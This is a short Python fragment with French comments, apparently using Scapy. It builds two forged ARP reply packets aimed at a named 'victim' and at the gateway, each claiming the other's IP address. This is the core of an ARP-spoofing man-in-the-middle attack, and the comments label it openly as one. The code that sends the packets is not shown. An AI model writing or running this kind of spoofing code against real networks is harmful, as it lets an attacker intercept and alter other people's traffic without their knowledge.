#Creation du faux paquet pour envoyer a la victime
fauxARP = ARP()
fauxARP.op = 2
#L'addresse IP de la source du paquet est l'IP de la gateway
fauxARP.psrc = self.IpGw
#L'adresse IP de destination du paquet est l'IP de la victime
fauxARP.pdst = self.IpVictim
#L'adresse Mac de destination du paquet est l'adresse Mac de la victime
fauxARP.hwdst = self.MacVictim

#Creation du faux paquet pour envoyer a la gateway
fauxARPGW = ARP()
fauxARPGW.op=2
#L'addresse IP de la source du paquet est l'IP de la victime
fauxARPGW.psrc= self.IpVictim
#L'adresse IP de destination du paquet est l'IP de la gateway
fauxARPGW.pdst= self.IpGw
#L'adresse Mac de destination du paquet est l'adresse Mac de la gateway
fauxARPGW.hwdst= self.MacGw